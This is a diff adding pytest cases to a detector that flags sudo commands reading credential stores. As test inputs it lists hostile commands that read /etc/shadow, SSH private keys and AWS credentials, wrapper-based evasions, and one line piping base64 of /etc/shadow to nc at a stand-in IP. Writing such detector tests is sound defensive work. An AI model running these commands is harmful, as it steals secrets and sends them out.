@@ -240,3 +240,33 @@ def test_many_routine_sudo_lines_give_nothing_but_the_reads():
     assert {m.group_key for m in out} == {out[0].group_key, out[-1].group_key} and len({m.group_key for m in out}) == 2
     assert {("shadow" in m.claim, "id_rsa" in m.claim) for m in out} == {(True, False), (False, True)}
     assert rule.evaluated == 50_000
+
+
+@pytest.mark.parametrize("command, path", [
+    ("/usr/bin/cat /root/.aws/credentials /etc/shadow", "/etc/shadow"),
+    ("/usr/bin/cat /etc/sudoers /etc/shadow", "/etc/shadow"),
+    ("/bin/sh -c tar czf /tmp/a.tgz /root/.ssh; cat /etc/shadow", "/etc/shadow"),
+    ("/usr/bin/cat /root/.ssh/id_rsa.pub /root/.ssh/id_rsa", "/root/.ssh/id_rsa"),
+])
+def test_the_strongest_named_store_decides_whatever_the_argument_order(command, path):
+    _rule, [m] = judge(sudo(command))
+    assert m.proposed_lane == "high" and m.severity == "high"
+    assert "'cat' reads the files it is given, and its arguments name" in m.claim and path in m.claim
+
+
+@pytest.mark.parametrize("command", [
+    "/bin/bash -c cat /etc/shadow|base64",
+    "/bin/bash -c cat /etc/shadow;id",
+    "/bin/bash -c cat /etc/shadow>/tmp/s",
+    "/bin/bash -c cat</etc/shadow",
+    "/bin/bash -c base64</etc/shadow|nc 192.0.2.9 80",
+    "/bin/bash -c 'cat /etc/shadow'",
+    "/usr/bin/env -u FOO /usr/bin/cat /etc/shadow",
+    "/usr/bin/nice -n 10 cat /etc/shadow",
+    "/usr/bin/timeout -s KILL 5 cat /etc/shadow",
+    "/usr/bin/ionice -c 2 -n 0 cat /etc/shadow",
+    "/bin/busybox cat /etc/shadow",
+])
+def test_unspaced_shell_syntax_and_wrapper_option_values_are_read(command):
+    _rule, [m] = judge(sudo(command))
+    assert m.proposed_lane == "high" and "/etc/shadow" in m.claim
